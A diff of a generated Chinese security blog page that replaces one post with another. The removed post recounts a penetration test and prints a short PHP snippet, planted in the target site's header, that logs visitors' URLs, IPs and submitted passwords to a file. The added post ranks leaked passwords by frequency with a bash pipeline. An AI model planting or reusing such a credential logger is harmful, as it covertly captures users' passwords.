@@ -1135,8 +1135,8 @@ o = AES.new(key, AES.MODE_CBC).decrypt(password)
           
           
             
-              <a class="post-title-link" href="/2015/07/16/PHPURLForm/" itemprop="url">
-                PHP记录URL、表单内容
+              <a class="post-title-link" href="/2015/06/08/passwdTOPN/" itemprop="url">
+                高效词频分析
               </a>
             
           
@@ -1146,8 +1146,8 @@ o = AES.new(key, AES.MODE_CBC).decrypt(password)
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2015-07-16T15:52:28+08:00" content="2015-07-16">
-            2015-07-16
+          <time itemprop="dateCreated" datetime="2015-06-08T17:23:33+08:00" content="2015-06-08">
+            2015-06-08
           </time>
         </span>
 
@@ -1157,8 +1157,8 @@ o = AES.new(key, AES.MODE_CBC).decrypt(password)
           
             <span class="post-comments-count">
             &nbsp; | &nbsp;
-            <a href="/2015/07/16/PHPURLForm/#comments" itemprop="discussionUrl">
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/07/16/PHPURLForm/" itemprop="commentsCount"></span>
+            <a href="/2015/06/08/passwdTOPN/#comments" itemprop="discussionUrl">
+              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/06/08/passwdTOPN/" itemprop="commentsCount"></span>
             </a>
           </span>
           
@@ -1173,19 +1173,13 @@ o = AES.new(key, AES.MODE_CBC).decrypt(password)
 
       
         
-          <span itemprop="articleBody"><p>某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。<br>通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此时有了URL和密码，就可以获得解密后的文件。</p>
-<pre><code>&lt;?php
-<span class="variable">$URL</span>[<span class="string">'URL'</span>] = <span class="string">"http://"</span>.$_SERVER[<span class="string">'SERVER_NAME'</span>].$_SERVER[<span class="string">'PHP_SELF'</span>].($_SERVER[<span class="string">'QUERY_STRING'</span>] ? <span class="string">"?"</span>.$_SERVER[<span class="string">'QUERY_STRING'</span>] : <span class="string">""</span>); 
-<span class="variable">$ip</span>=$_SERVER[<span class="string">"REMOTE_ADDR"</span>];
-<span class="variable">$pass</span> = $_POST[<span class="string">"passname"</span>];
-<span class="variable">$fp</span> = fopen(<span class="string">'/var/www/log.txt'</span>, <span class="string">'a+b'</span>);
-fwrite(<span class="variable">$fp</span>, var_export(<span class="variable">$URL</span>[<span class="string">'URL'</span>], <span class="literal">true</span>));
-fwrite(<span class="variable">$fp</span>, <span class="variable">$pass</span>);
-fwrite(<span class="variable">$fp</span>, <span class="variable">$ip</span>);
-fwrite(<span class="variable">$fp</span>, <span class="string">"\n"</span>);
-fclose(<span class="variable">$fp</span>);
-?&gt;
-</code></pre></span>
+          <span itemprop="articleBody"><p>由于密码泄露越来越普遍，使得各类“密码分析”工具越来越多。比如最近很火的Pipal，由ruby编写的一款程序，可以分析出密码频率TOP N。但实际使用中发现效率较低。</p>
+<p>实际上通过简单的bash命令就可以实现上述的功能：</p>
+<pre><code>cat password.txt |<span class="string"> sort </span>|<span class="string"> uniq -c </span>|<span class="string"> sort -k1,1nr </span>|<span class="string"> head -10</span>
+</code></pre><p>提取password词频TOP10的密码</p>
+<p><code>time cat pass.txt | sort | uniq -c | sort -k1,1nr | head -10 &gt;</code> result.txt<br>保存提取结果并记录所消耗时间</p>
+<p>由于sort是C语言编写，效率远高于Pipal。在数据量较大的词频统计时，差距尤其明显。<br>实际测试 在虚拟机中两亿条数据获取top 10000 大概50分钟左右。</p>
+</span>
         
       
     </div>
@@ -1242,7 +1236,7 @@ fclose(<span class="variable">$fp</span>);
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">12</span>
+              <span class="site-state-item-count">11</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
